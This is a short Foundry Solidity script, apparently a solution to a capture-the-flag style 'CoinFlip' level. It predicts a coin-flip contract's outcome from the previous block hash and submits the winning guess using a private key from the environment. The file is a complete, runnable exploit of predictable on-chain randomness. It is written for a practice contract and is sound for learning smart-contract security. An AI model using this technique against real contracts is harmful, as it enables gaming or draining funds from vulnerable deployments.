// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool) external returns (bool);

    function FACTOR() external view returns (uint256);
}

contract CoinFlipScript is Script {
    function run() external {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        ICoinFlip coinFlip = ICoinFlip(vm.envAddress("COINFLIP_ADDRESS"));
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue / factor;
        bool guess = (flip == 1);
        bool success = coinFlip.flip(guess);
        if (!success) revert("FAILED..");
        console.log(coinFlip.consecutiveWins());

        vm.stopBroadcast();
    }
}